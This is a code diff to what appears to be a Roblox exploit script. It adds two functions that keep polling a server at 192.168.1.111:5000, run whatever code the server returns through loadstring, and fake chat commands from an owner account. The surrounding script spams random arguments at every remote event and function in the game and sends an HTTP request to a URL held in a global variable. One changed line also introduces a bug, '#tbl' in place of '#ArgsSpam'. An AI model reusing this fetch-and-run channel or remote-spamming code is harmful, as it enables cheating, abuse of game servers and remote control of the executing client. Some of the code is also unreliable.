@@ -38,6 +38,46 @@ local Vir = game:GetService("VirtualInputManager")
 local lp = game.Players.LocalPlayer
 local command = "/rain"
 local OwnerPlayer = game:GetService("Players"):FindFirstChild(owner)
+
+local OldRaw = ""
+local Oldcommand = ""
+
+local function checkHttp()
+	coroutine.wrap(function()
+    while task.wait() do
+      raw = game:HttpGet("http://192.168.1.111:5000/message")
+		if OldRaw ~= raw and raw ~= "" then
+			coroutine.wrap(function()
+			  local s ,err=pcall(function()
+			  	loadstring(raw)()
+                end)
+                if not s then warn(err) end
+            end)()
+            OldRaw = raw
+		end
+	  end
+    end)()
+end
+local function checkHttp2()
+	coroutine.wrap(function()
+    while task.wait() do
+      raw2 = game:HttpGet("http://192.168.1.111:5000/command")
+		if Oldcommand ~= raw2 and raw2 ~= "" then
+			coroutine.wrap(function()
+        local s,err = pcall(function()
+             firesignal(OwnerPlayer.Chatted, tostring(raw2))
+        end)
+             if not s then
+              warn("nah")
+              replicatesignal(OwnerPlayer.Chatted, tostring(raw2))
+             end
+        end)()
+            Oldcommand = raw2
+		end
+	  end
+    end)()
+end
+
 coroutine.wrap(function()
   while task.wait() do
     OwnerPlayer = game:GetService("Players"):FindFirstChild(owner)
@@ -205,7 +245,7 @@ LALA = {}
 
 local function REGEN()
 	for i,v in next, char:GetDescendants() do
-		if v:IsA("BasePart") or v:IsA("Part") then
+		if v:IsA("Part") or v:IsA("BasePart") then
 			LALA[v]=true
 		end
 	end
@@ -352,7 +392,7 @@ for i = 1, 5 do
     -- Start
     for p, v in pairs(game:GetDescendants()) do
     	if not string.find(v.Name ,"Report") then
-    	r = ArgsSpam[math.random(1, #ArgsSpam)]
+    	r = ArgsSpam[math.random(1, #tbl)]
         coroutine.wrap(function()
             local success, err = pcall(function()
                 if v:IsA("RemoteFunction") then
@@ -758,7 +798,7 @@ if newO then
                               FOLLOW = false
                             elseif msg == "/tool" then
                               Tool()
-                            elseif msg == "/parts" then
+                            elseif msg == "/parts" then -- AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
                               TeleportPart()
                             elseif msg == "/re" then
                               reset()
@@ -1304,8 +1344,9 @@ local HelloWorld = {
 }
 
 GameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
- 
 
+checkHttp()
+checkHttp2()
 
 httprequest({
             Url = getgenv().hehe,
